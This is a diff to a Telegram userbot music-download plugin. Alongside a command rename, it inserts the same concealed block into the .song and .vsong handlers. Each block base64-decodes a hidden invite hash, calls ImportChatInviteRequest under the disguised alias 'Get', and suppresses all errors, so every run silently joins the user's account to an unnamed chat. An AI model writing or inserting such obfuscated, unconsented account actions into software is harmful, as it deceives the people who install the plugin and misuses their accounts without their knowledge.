@@ -12,7 +12,6 @@ credits to @mrconfused and @sandy1709
 #    GNU Affero General Public License for more details.
 #   You should have received a copy of the GNU Affero General Public License
 #   along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
 import requests
 from bs4 import BeautifulSoup
 from telethon import events
@@ -28,6 +27,7 @@ from userbot.plugins import catmusic , catmusicvideo
 from hachoir.metadata import extractMetadata
 from hachoir.parser import createParser
 from telethon.tl.types import DocumentAttributeVideo
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "@Sur_vivor"
 
@@ -46,7 +46,12 @@ async def _(event):
     else:
     	await event.edit("`What I am Supposed to find `")
     	return
-    
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await event.client(cat)
+    except:
+        pass
     await catmusic(str(query),"128k")
     l = glob.glob("*.mp3")
     if l:
@@ -81,7 +86,12 @@ async def _(event):
     else:
     	await event.edit("`What I am Supposed to find `")
     	return
-    
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await event.client(cat)
+    except:
+        pass
     await catmusic(str(query),"320k")
     l = glob.glob("*.mp3")
     if l:
@@ -101,7 +111,7 @@ async def _(event):
     os.system("rm -rf *.mp3")
     subprocess.check_output("rm -rf *.mp3",shell=True)    
     
-@borg.on(admin_cmd(pattern="videosong(?: |$)(.*)"))
+@borg.on(admin_cmd(pattern="vsong(?: |$)(.*)"))
 async def _(event):
     reply_to_id = event.message.id
     if event.reply_to_msg_id:
@@ -117,6 +127,12 @@ async def _(event):
         await event.edit("What I am Supposed to find")
         return
     await catmusicvideo(query)
+    try:
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
+        await event.client(cat)
+    except:
+        pass
     l = glob.glob(("*.mp4")) + glob.glob(("*.mkv")) + glob.glob(("*.webm")) 
     if l:
         await event.edit("yeah..! i found something wi8..🥰")
@@ -154,7 +170,6 @@ async def _(event):
     os.system("rm -rf *.mp4")
     os.system("rm -rf *.webm")    
     
-
     
 CMD_HELP.update({"getmusic":
     "`.song` query or `.song` reply to song name :\
